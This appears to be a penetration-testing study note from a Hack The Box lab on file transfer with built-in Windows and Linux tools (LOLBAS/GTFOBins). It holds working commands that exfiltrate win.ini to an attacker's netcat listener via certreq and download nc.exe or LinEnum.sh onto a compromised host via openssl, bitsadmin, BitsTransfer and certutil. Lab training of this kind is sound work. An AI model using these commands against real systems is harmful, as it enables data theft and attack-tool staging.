---
description: >-
  Abusing Installed services
title: Living off the land (LOLBAS & GTFOBins)           # Add title here
date: 2024-01-15 08:00:00 -0600                           # Change the date to match completion date
categories: [03 File Transfer, Living off the land (LOLBAS & GTFOBins)]                     # Change Templates to Writeup
tags: [file transfer, python, lolbas, gtfobins]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
---

### Upload win.ini to our Pwnbox

This will send the file to our Netcat session, and we can copy-paste its contents.
```powershell
C:\htb> certreq.exe -Post -config http://192.168.49.128/ c:\windows\win.ini
```

File Received in our Netcat Session
```bash
Shuciran@htb[/htb]$ sudo nc -lvnp 80

POST / HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Content-Type: application/json
User-Agent: Mozilla/4.0 (compatible; Win32; NDES client 10.0.19041.1466/vb_release_svc_prod1)
Content-Length: 92
Host: 192.168.49.128

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```
### GTFOBins
To search for the download and upload function in GTFOBins for Linux Binaries, we can use +file download or +file upload.

![GTFOBins](/assets/img/Pasted-image-20240115221147.png)

### OpenSSL
```bash
Shuciran@htb[/htb]$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem

Generating a RSA private key
.......................................................................................................+++++
................+++++
writing new private key to 'key.pem'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:
```

### Stand up the Server in our Pwnbox
```bash
Shuciran@htb[/htb]$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```

Download File from the Compromised Machine:
```bash
Shuciran@htb[/htb]$ openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```

### Bitsadmin File Download
```powershell
PS C:\htb> bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
```

Download:
```powershelll
PS C:\htb> Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

### Download a File with Certutil
```powershell
C:\htb> certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe
```